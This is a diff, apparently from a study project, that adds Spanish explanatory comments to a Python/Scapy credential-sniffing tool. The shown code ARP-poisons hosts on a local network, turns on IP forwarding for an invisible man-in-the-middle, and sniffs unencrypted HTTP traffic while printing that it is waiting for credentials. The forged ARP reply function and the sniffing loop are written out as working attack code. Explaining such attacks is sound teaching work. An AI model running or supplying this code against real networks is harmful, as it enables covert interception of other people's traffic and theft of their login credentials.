@@ -18,9 +18,13 @@ paquetes_procesados = set()
 
 def procesar_paquete(paquete):
     global paquetes_procesados
+    
+    # Solo nos interesan los paquetes de datos (TCP) que contengan texto (Raw)
     if not (paquete.haslayer(TCP) and paquete.haslayer(Raw)):
         return
 
+    # Filtramos para analizar solo el tráfico web (Puerto 80 = HTTP)
+    # OWASP A02:2021 (Cryptographic Failures) advierte contra el uso de protocolos sin cifrar como HTTP.
     tcp = paquete[TCP]
     if tcp.dport != 80 and tcp.sport != 80:
         return
@@ -136,6 +140,9 @@ def forzar_descubrimiento(mi_ip):
 
 
 def activar_ip_forwarding():
+    # El IP Forwarding convierte a la computadora en un "Router" temporal.
+    # Es fundamental para un ataque Man-in-the-Middle (MitM) invisible; 
+    # sin esto, el tráfico se bloquea (Denegación de Servicio).
     print("[*] Activando IP Forwarding (Reenvío de IP) en Windows...")
     try:
         # Intenta usar PowerShell
@@ -262,6 +269,9 @@ def escanear_red(rango, interfaz, mi_ip, gateway):
 
 
 def spoof(ip_objetivo, mac_objetivo, ip_suplantada, mi_mac, interfaz):
+    # VULNERABILIDAD CAPA 2 (Enlace de Datos): Envenenamiento ARP (ARP Spoofing)
+    # Crea un paquete ARP falso diciendo: "La IP suplantada (Router) ahora tiene mi dirección MAC".
+    # Como el protocolo ARP no tiene autenticación, las víctimas lo aceptan ciegamente.
     paquete = Ether(dst=mac_objetivo) / ARP(
         op=2, pdst=ip_objetivo, hwdst=mac_objetivo,
         psrc=ip_suplantada, hwsrc=mi_mac
@@ -284,6 +294,7 @@ def restaurar(dispositivos, gateway, mac_gateway, interfaz):
 
 
 def hilo_interceptar_red(interfaz, mi_ip, gateway, rango):
+    # Este hilo se ejecuta en segundo plano. Mantiene a las víctimas engañadas.
     mi_mac = get_if_hwaddr(interfaz)
     print(f"[*] Preparando intercepción invisible (ARP Spoofing)...")
     mac_gateway = obtener_mac(gateway, interfaz)
@@ -336,7 +347,7 @@ def main():
     # 2. Descubrir la red
     gateway, rango = detectar_red_completa(mi_ip)
     
-    # 3. Lanzar el interceptor ARP (Ataque) en un hilo paralelo
+    # 3. Lanzar el interceptor ARP (Ataque Man-in-the-Middle) en un hilo paralelo
     t_interceptor = threading.Thread(
         target=hilo_interceptar_red, 
         args=(INTERFAZ, mi_ip, gateway, rango)
@@ -351,10 +362,11 @@ def main():
     print("[*] Esperando pacientemente credenciales...\n")
 
     try:
+        # La función sniff de Scapy "olfatea" (captura) todo el tráfico que pasa por la tarjeta de red.
         sniff(
             iface=INTERFAZ,
             filter="tcp port 80",
-            prn=procesar_paquete,
+            prn=procesar_paquete, # Por cada paquete capturado, ejecuta procesar_paquete()
             store=False
         )
     except KeyboardInterrupt:
